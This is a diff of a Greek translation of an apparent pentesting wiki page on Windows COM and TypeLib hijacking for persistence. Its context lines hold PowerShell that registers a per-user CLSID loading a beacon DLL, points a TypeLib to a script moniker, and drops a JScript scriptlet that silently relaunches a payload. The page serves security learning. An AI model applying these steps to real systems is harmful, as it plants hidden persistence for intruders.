@@ -2,23 +2,23 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Αναζήτηση μη υπαρχόντων COM components
+### Αναζήτηση μη υπαρχόντων COM συστατικών
 
-Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** μπορεί να χρησιμοποιηθεί ως **μηχανισμός επιμονής**. Χρησιμοποιώντας το `procmon` είναι εύκολο να βρείτε καταχωρήσεις COM που αναζητήθηκαν αλλά δεν υπάρχουν, τις οποίες ένας επιτιθέμενος θα μπορούσε να δημιουργήσει για να διατηρήσει την επιμονή του. Φίλτρα:
+Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** μπορεί να χρησιμοποιηθεί για επίμονη παρουσία. Χρησιμοποιώντας το `procmon` είναι εύκολο να βρείτε αναζητούμενα κλειδιά μητρώου COM που δεν υπάρχουν και που ένας επιτιθέμενος θα μπορούσε να δημιουργήσει για να παραμείνει. Φίλτρα:
 
-- **RegOpenKey** operations.
+- **RegOpenKey** λειτουργίες.
 - όπου το _Result_ είναι **NAME NOT FOUND**.
 - και το _Path_ τελειώνει με **InprocServer32**.
 
-Μόλις αποφασίσετε ποιο μη υπάρχον COM θα υποδυθείτε, εκτελέστε τις παρακάτω εντολές. _Προσοχή αν αποφασίσετε να υποδυθείτε ένα COM που φορτώνεται κάθε μερικά δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._
+Μόλις αποφασίσετε ποιο μη υπάρχον COM θα μιμηθείτε, εκτελέστε τις ακόλουθες εντολές. _Προσοχή εάν αποφασίσετε να μιμηθείτε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Ευάλωτα COM συστατικά του Task Scheduler
+### COM components του Task Scheduler που μπορούν να ανακαταληφθούν
 
-Οι Windows Tasks χρησιμοποιούν Custom Triggers για να καλούν COM objects και επειδή εκτελούνται μέσω του Task Scheduler, είναι πιο εύκολο να προβλέψει κανείς πότε θα ενεργοποιηθούν.
+Τα Windows Tasks χρησιμοποιούν Custom Triggers για να καλέσουν COM objects και επειδή εκτελούνται μέσω του Task Scheduler, είναι πιο εύκολο να προβλέψει κανείς πότε θα ενεργοποιηθούν.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -49,9 +49,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-Εξετάζοντας την έξοδο, μπορείτε να επιλέξετε ένα που θα εκτελείται, για παράδειγμα, **κάθε φορά που ένας χρήστης συνδέεται**.
+Ελέγχοντας την έξοδο μπορείτε να επιλέξετε για παράδειγμα ένα που θα εκτελείται **κάθε φορά που ένας χρήστης συνδέεται**.
 
-Τώρα, αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\CLASSES\ROOT\CLSID** και στο HKLM και HKCU, συνήθως θα βρείτε ότι η τιμή δεν υπάρχει στο HKCU.
+Τώρα, αν αναζητήσετε το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\CLASSES\ROOT\CLSID** και στο HKLM και στο HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -72,32 +72,32 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Τότε, μπορείτε απλώς να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.
+Τότε, μπορείτε απλά να δημιουργήσετε την εγγραφή HKCU και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.
 
 ---
 
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Οι Type Libraries (TypeLib) περιγράφουν COM interfaces και φορτώνονται μέσω της `LoadTypeLib()`. Όταν ένας COM server δημιουργείται, το λειτουργικό σύστημα μπορεί επίσης να φορτώσει το αντίστοιχο TypeLib συμβουλευόμενο τα κλειδιά μητρώου κάτω από `HKCR\TypeLib\{LIBID}`. Εάν η διαδρομή του TypeLib αντικατασταθεί με έναν **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet όταν το TypeLib επιλυθεί — οδηγώντας σε stealthy persistence που ενεργοποιείται όταν χρησιμοποιηθούν κοινά components.
+Οι Type Libraries (TypeLib) ορίζουν COM interfaces και φορτώνονται μέσω της `LoadTypeLib()`. Όταν ένας COM server δημιουργείται, το λειτουργικό σύστημα (OS) μπορεί επίσης να φορτώσει την συνδεδεμένη TypeLib συμβουλευόμενο τα registry keys κάτω από `HKCR\TypeLib\{LIBID}`. Αν το μονοπάτι της TypeLib αντικατασταθεί με έναν **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet όταν επιλυθεί η TypeLib — δημιουργώντας μια stealthy persistence που ενεργοποιείται όταν αγγίζονται κοινά components.
 
-Αυτό έχει παρατηρηθεί εναντίον του Microsoft Web Browser control (συχνά φορτώνεται από Internet Explorer, εφαρμογές που ενσωματώνουν WebBrowser, και ακόμη και το `explorer.exe`).
+Αυτό έχει παρατηρηθεί εναντίον του Microsoft Web Browser control (συχνά φορτώνεται από Internet Explorer, εφαρμογές που ενσωματώνουν WebBrowser, και ακόμη και `explorer.exe`).
 
-### Βήματα (PowerShell)
+### Steps (PowerShell)
 
-1) Εντοπίστε το TypeLib (LIBID) που χρησιμοποιείται από ένα CLSID υψηλής συχνότητας. Παράδειγμα CLSID που συχνά καταχρώνται από malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
+1) Εντοπίστε το TypeLib (LIBID) που χρησιμοποιείται από ένα CLSID υψηλής συχνότητας. Παράδειγμα CLSID που συχνά καταχράζονται από malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
 $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
 $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
-2) Δείξτε τη διαδρομή TypeLib ανά χρήστη σε ένα τοπικό scriptlet χρησιμοποιώντας το moniker `script:` (δεν απαιτούνται δικαιώματα διαχειριστή):
+2) Κατευθύνετε το per-user TypeLib path σε ένα τοπικό scriptlet χρησιμοποιώντας το μονίκερ `script:` (δεν απαιτούνται δικαιώματα διαχειριστή):
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-3) Drop ένα ελάχιστο JScript `.sct` που επανεκκινεί το κύριο payload σας (π.χ. ένα `.lnk` που χρησιμοποιήθηκε από την αρχική αλυσίδα):
+3) Drop μια ελάχιστη JScript `.sct` που επανεκκινεί το κύριο payload σας (π.χ. ένα `.lnk` που χρησιμοποιήθηκε από την αρχική αλυσίδα):
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -114,7 +114,7 @@ sh.Run(cmd, 0, false);
 </script>
 </scriptlet>
 ```
-4) Ενεργοποίηση – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το WebBrowser control, ή ακόμη και οι συνήθεις δραστηριότητες του Explorer θα φορτώσουν το TypeLib και θα εκτελέσουν το scriptlet, επανενεργοποιώντας την αλυσίδα σας κατά το logon/reboot.
+4) Triggering – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το WebBrowser control, ή ακόμη και μια καθημερινή δραστηριότητα του Explorer, θα φορτώσει το TypeLib και θα εκτελέσει το scriptlet, επανενεργοποιώντας την αλυσίδα σας κατά το logon/reboot.
 
 Καθαρισμός
 ```powershell
@@ -124,8 +124,8 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
 Σημειώσεις
-- Μπορείτε να εφαρμόσετε την ίδια λογική και σε άλλα συχνά χρησιμοποιούμενα COM components· πάντα επιλύετε πρώτα το πραγματικό `LIBID` από `HKCR\CLSID\{CLSID}\TypeLib`.
-- Σε συστήματα 64-bit μπορείτε επίσης να συμπληρώσετε το υποκλειδί `win64` για τους 64-bit consumers.
+- Μπορείτε να εφαρμόσετε την ίδια λογική και σε άλλα υψηλής συχνότητας συστατικά COM· να επιλύετε πάντα πρώτα το πραγματικό `LIBID` από `HKCR\CLSID\{CLSID}\TypeLib`.
+- Σε συστήματα 64-bit μπορείτε επίσης να γεμίσετε το υποκλειδί `win64` για καταναλωτές 64-bit.
 
 ## Αναφορές
 
